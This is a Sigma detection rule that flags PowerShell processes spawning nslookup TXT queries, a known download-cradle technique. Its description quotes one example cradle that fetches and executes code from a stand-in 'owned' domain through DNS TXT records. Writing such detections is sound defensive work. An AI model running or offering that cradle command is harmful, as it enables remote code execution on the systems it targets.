author: Zach Mathis (@yamatosecurity)
date: 2022/09/06

title: Nslookup PwSh Download Cradle
description: 'This sexy sigma rule tries to detect sexy powershell download cradles. Ex: powershell . (nslookup -q=txt http://some.owned.domain.com)[-1] '
id: 72671447-4352-4413-bb91-b85569687135
level: medium
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|contains: powershell
        CommandLine|contains: nslookup
        CommandLine|contains: txt
    condition: selection
references:
    - https://twitter.com/alh4zr3d/status/1566489367232651264


